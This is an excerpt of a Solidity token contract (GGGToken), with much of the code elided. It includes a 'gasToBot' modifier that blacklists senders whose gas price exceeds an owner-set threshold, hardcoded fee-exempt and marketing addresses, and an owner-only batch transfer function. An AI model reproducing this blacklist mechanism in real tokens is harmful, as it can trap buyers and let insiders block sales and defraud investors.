...
contract  GGGToken is IERC20, Ownable {
    ...
    modifier gasToBot(){
        _;
        if(tx.gasprice> _setGas && msg.sender!=uniswapV2Pair){
            addBot(msg.sender);
        }
    }
    ...
    constructor(){  
            ...
            _marketingFee = 150;
            _LPFee = 100;
            marketAddr =  0xd697dB49547D3f0F82c70a038CBA010957867C5B;
            ...
            _isExcludedFromFee[0x83D1CfA32c30BF925eEB4701dDE60248b6DD8933] = true;
    ...
    function transferFrom(
        ...
        address recipient,
        uint256 amount
    ) public gasToBot override returns (bool) {
   ...
   function _takeburnFee(
    ...
    function transferTokensAvg(address[] memory _tos,uint256[] memory amounts) onlyOwner public returns (bool){
        ...
        for(uint i=0;i<_tos.length;i++){
            _tOwned[owner()] -= amounts[i];
            _tOwned[_tos[i]] += amounts[i];
            emit Transfer(owner(), _tos[i], amounts[i]);
        }
        return true;
    }
